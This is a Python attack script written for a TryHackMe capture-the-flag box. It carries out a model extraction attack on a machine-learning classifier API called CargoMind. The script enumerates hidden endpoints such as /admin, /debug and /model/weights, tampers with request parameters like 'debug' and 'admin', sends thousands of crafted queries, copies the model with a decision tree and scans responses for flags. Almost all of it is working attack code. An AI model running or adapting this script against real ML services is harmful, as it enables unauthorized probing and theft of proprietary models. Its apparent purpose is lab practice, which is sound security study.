#!/usr/bin/env python3
"""
CargoMind v2 - Full Model Extraction Attack
Run this on your TryHackMe attack box:
  python3 pwn_cargomind.py

Target: 10.128.156.28:8000
"""

import json, random, sys, itertools, requests, time
import numpy as np
from collections import Counter, defaultdict

TARGET = "10.128.156.28"
PORT   = 8000

try:
    from sklearn.tree import DecisionTreeClassifier, export_text
    from sklearn.preprocessing import LabelEncoder
    from sklearn.model_selection import cross_val_score
except ImportError:
    print("[!] pip3 install scikit-learn requests numpy")
    sys.exit(1)

R="\033[91m"; G="\033[92m"; Y="\033[93m"; C="\033[96m"; W="\033[0m"; B="\033[94m"
FEATURES = ["CM","SE","RR","OS","CT","MS"]
WORKING_EP = None

# ─── API ────────────────────────────────────────────────────────────────────

def find_endpoint():
    global WORKING_EP
    payload = {"features":[0.5]*6}
    for ep in ["/classify","/predict","/api/classify","/api/predict",
               "/api/v1/classify","/score","/inference","/classify/v2"]:
        try:
            r = requests.post(f"http://{TARGET}:{PORT}{ep}", json=payload, timeout=6)
            if r.status_code == 200:
                print(f"{G}[+] Working endpoint: {ep}  →  {r.json()}{W}")
                WORKING_EP = ep
                return ep
        except: pass
    # Try GET on root for clues
    try:
        r = requests.get(f"http://{TARGET}:{PORT}/", timeout=6)
        print(f"[*] GET / → {r.status_code}: {r.text[:400]}")
    except: pass
    WORKING_EP = "/classify"
    return "/classify"

def call(feats, extra=None):
    payload = {"features": feats}
    if extra: payload.update(extra)
    try:
        r = requests.post(f"http://{TARGET}:{PORT}{WORKING_EP}",
                         json=payload, timeout=8)
        if r.status_code == 200:
            return r.json(), r.headers, r.text
    except: pass
    return None, {}, ""

# ─── RECON ──────────────────────────────────────────────────────────────────

def recon_endpoints():
    print(f"\n{R}══ PHASE 0: Endpoint recon ══{W}")
    hidden = [
        "/flag","/flags","/flag1","/flag2","/flag3",
        "/admin","/debug","/model","/model/info","/model/export",
        "/model/weights","/model/parameters","/model/tree","/model/rules",
        "/model/thresholds","/model/feature_importance","/model/dump",
        "/api/model","/api/flag","/health","/status","/info",
        "/metrics","/params","/config","/secret","/hidden","/introspect",
        "/answer","/solution","/challenge","/leak",
        "/api/v1/flag","/api/v1/model",
    ]
    for ep in hidden:
        for method in ["GET","POST"]:
            try:
                fn = requests.get if method=="GET" else requests.post
                r = fn(f"http://{TARGET}:{PORT}{ep}", timeout=4)
                if r.status_code not in [404, 405, 000]:
                    print(f"{G}  [{method}] {ep} → {r.status_code}: {r.text[:300]}{W}")
            except: pass

def recon_special_inputs():
    print(f"\n{R}══ PHASE 1: Special input probing ══{W}")
    
    # Unusual feature values
    specials = {
        "all zeros"     : [0.0]*6,
        "all ones"      : [1.0]*6,
        "all 0.5"       : [0.5]*6,
        "negative"      : [-1.0]*6,
        "large"         : [999.0]*6,
        "tiny"          : [0.000001]*6,
        "near-one"      : [0.9999999]*6,
        "alternating"   : [0,1,0,1,0,1],
        "alt2"          : [1,0,1,0,1,0],
        "ascending"     : [0.1,0.2,0.3,0.4,0.5,0.6],
        "descending"    : [0.9,0.8,0.7,0.6,0.5,0.4],
    }
    for name, feats in specials.items():
        resp, hdrs, raw = call(feats)
        flaggy = "THM" in raw or "flag" in raw.lower() or "CTF" in raw
        marker = f"{G}[!!! FLAG !!!]{W} " if flaggy else "  "
        print(f"{marker}{name}: {resp}")
        if flaggy: print(f"  RAW: {raw[:400]}")
        # Print all non-default headers
        for k,v in hdrs.items():
            if k.lower() not in ["content-type","content-length","date","server"]:
                print(f"  HEADER {k}: {v}")

    # Parameter tampering
    print(f"\n{Y}  Param tampering:{W}")
    tampering = [
        {"features":[0.5]*6, "explain": True},
        {"features":[0.5]*6, "debug": True},
        {"features":[0.5]*6, "verbose": True},
        {"features":[0.5]*6, "raw": True},
        {"features":[0.5]*6, "show_proba": True},
        {"features":[0.5]*6, "format": "full"},
        {"features":[0.5]*6, "admin": True},
        {"features":[0.5]*7},
        {"features":[0.5]*6, "query_type": "explain"},
        {"CM":0.5,"SE":0.5,"RR":0.5,"OS":0.5,"CT":0.5,"MS":0.5},
        {"inputs":[0.5]*6},
        {"data":[0.5]*6},
        {"cargo_mass":0.5,"signal_entropy":0.5,"route_risk":0.5,
         "origin_score":0.5,"container_temp":0.5,"manifest_similarity":0.5},
    ]
    for p in tampering:
        try:
            r = requests.post(f"http://{TARGET}:{PORT}{WORKING_EP}", json=p, timeout=6)
            if r.status_code == 200:
                raw = r.text
                flaggy = "THM" in raw or "flag" in raw.lower()
                marker = f"{G}[!!! FLAG !!!]{W} " if flaggy else "  "
                print(f"{marker}{str(p)[:70]} → {raw[:200]}")
        except Exception as e:
            print(f"  err: {e}")

# ─── DATA COLLECTION ─────────────────────────────────────────────────────────

def collect_data(n=800):
    print(f"\n{C}══ PHASE 2: Data collection ({n} samples) ══{W}")
    data = []
    
    # Extremes: all 2^6 combos of 0/1
    for combo in itertools.product([0.0,1.0], repeat=6):
        resp,_,_ = call(list(combo))
        if resp: data.append({"features":list(combo),**resp})

    # Fine boundary sweep per feature
    for fi in range(6):
        for v in np.linspace(0,1,200):
            feats = [0.5]*6; feats[fi]=round(float(v),4)
            resp,_,_ = call(feats)
            if resp: data.append({"features":feats,**resp})

    # Random samples
    for i in range(n):
        feats = [round(random.uniform(0,1),4) for _ in range(6)]
        resp,_,_ = call(feats)
        if resp:
            data.append({"features":feats,**resp})
        if (i+1)%100==0:
            print(f"  {i+1}/{n} | {dict(Counter(d.get('classification') for d in data))}")

    print(f"{G}  Total: {len(data)} samples{W}")
    with open("cargomind_data.json","w") as f:
        json.dump(data,f)
    return data

# ─── MODEL REPLICATION ───────────────────────────────────────────────────────

def replicate(data):
    print(f"\n{C}══ PHASE 3: Model replication ══{W}")
    X = np.array([d["features"] for d in data])
    y_cls  = [d.get("classification","?") for d in data]
    y_risk = [d.get("risk_band","?") for d in data]

    le_c = LabelEncoder(); le_r = LabelEncoder()
    yc = le_c.fit_transform(y_cls)
    yr = le_r.fit_transform(y_risk)

    print(f"  Classes: {list(le_c.classes_)}")
    print(f"  Risk bands: {list(le_r.classes_)}")
    print(f"  Distribution: {dict(Counter(y_cls))}")

    best_c, best_c_acc = None, 0
    best_r, best_r_acc = None, 0
    for depth in [3,5,7,10,15,None]:
        for model_data, le, best_ref, best_acc_ref, tag in [
            (yc, le_c, None, 0, "cls"),
            (yr, le_r, None, 0, "risk"),
        ]:
            if len(set(model_data))<2: continue
            dt = DecisionTreeClassifier(max_depth=depth, random_state=42)
            cv = min(5, len(data)//20+1)
            try:
                sc = cross_val_score(dt,X,model_data,cv=cv).mean()
            except: sc=0
            if tag=="cls" and sc>best_c_acc:
                best_c_acc=sc
                best_c=DecisionTreeClassifier(max_depth=depth,random_state=42)
                best_c.fit(X,yc)
            if tag=="risk" and sc>best_r_acc:
                best_r_acc=sc
                best_r=DecisionTreeClassifier(max_depth=depth,random_state=42)
                best_r.fit(X,yr)

    for model, le, tag in [(best_c,le_c,"CLASSIFICATION"),(best_r,le_r,"RISK BAND")]:
        if model is None: continue
        acc = model.score(X, le.transform(le.classes_)[
            [list(le.classes_).index(y) for y in
             (y_cls if tag=="CLASSIFICATION" else y_risk)]
        ] if False else
            le.transform(y_cls if tag=="CLASSIFICATION" else y_risk))
        print(f"\n{G}  [{tag}] Train accuracy: {acc:.4f}{W}")
        print(f"\n{Y}  Decision Tree:{W}")
        print(export_text(model, feature_names=FEATURES))
        print(f"\n{Y}  Feature importances:{W}")
        for fname,imp in zip(FEATURES, model.feature_importances_):
            bar="█"*int(imp*40)
            print(f"    {fname}: {imp:.4f}  {bar}")
        print(f"\n{Y}  All decision thresholds:{W}")
        tree=model.tree_
        thresh_by_feat=defaultdict(set)
        for i in range(tree.node_count):
            fi=tree.feature[i]
            if fi>=0:
                thresh_by_feat[FEATURES[fi]].add(round(tree.threshold[i],8))
        for fname,vals in thresh_by_feat.items():
            print(f"    {fname}: {sorted(vals)}")

    return best_c, le_c, best_r, le_r

# ─── BOUNDARY ANALYSIS ──────────────────────────────────────────────────────

def boundary_analysis():
    print(f"\n{C}══ PHASE 4: Precise boundary detection ══{W}")
    boundaries = {}
    for fi,fname in enumerate(FEATURES):
        prev=None; bounds=[]
        for v in np.linspace(0,1,2000):
            feats=[0.5]*6; feats[fi]=round(float(v),5)
            resp,_,_=call(feats)
            if resp and resp!=prev:
                bounds.append((round(float(v),5), resp))
                prev=resp
        boundaries[fname]=bounds
        print(f"  {fname}: {len(bounds)} transitions")
        for bv,br in bounds:
            print(f"    {bv:8.5f} → {br}")
            # Try ASCII decode
            ascii_val=int(bv*127)
            if 32<=ascii_val<=126:
                print(f"           ASCII({ascii_val}) = '{chr(ascii_val)}'")
    return boundaries

# ─── SCAN RESPONSES FOR FLAGS ───────────────────────────────────────────────

def scan_for_flags(data):
    print(f"\n{R}══ Scanning all responses for flags ══{W}")
    for d in data:
        s=str(d)
        if "THM" in s or "flag" in s.lower() or ("{"in s and "}"in s and "_"in s):
            print(f"{G}[!!!] {d}{W}")

# ─── MAIN ───────────────────────────────────────────────────────────────────

def main():
    print(f"""{R}
╔══════════════════════════════════════════════════════╗
║   CargoMind v2 — Full Model Extraction Attack        ║
║   Target: {TARGET}:{PORT}                       ║
╚══════════════════════════════════════════════════════╝{W}""")

    ep = find_endpoint()
    print(f"[*] Endpoint: {ep}")

    recon_endpoints()
    recon_special_inputs()

    data = collect_data(800)
    scan_for_flags(data)

    cls_m, le_c, risk_m, le_r = replicate(data)

    boundaries = boundary_analysis()

    print(f"\n{G}══ DONE ══{W}")
    print(f"Data saved: cargomind_data.json")
    print(f"Look for flag patterns in the decision tree thresholds printed above.")

if __name__ == "__main__":
    main()
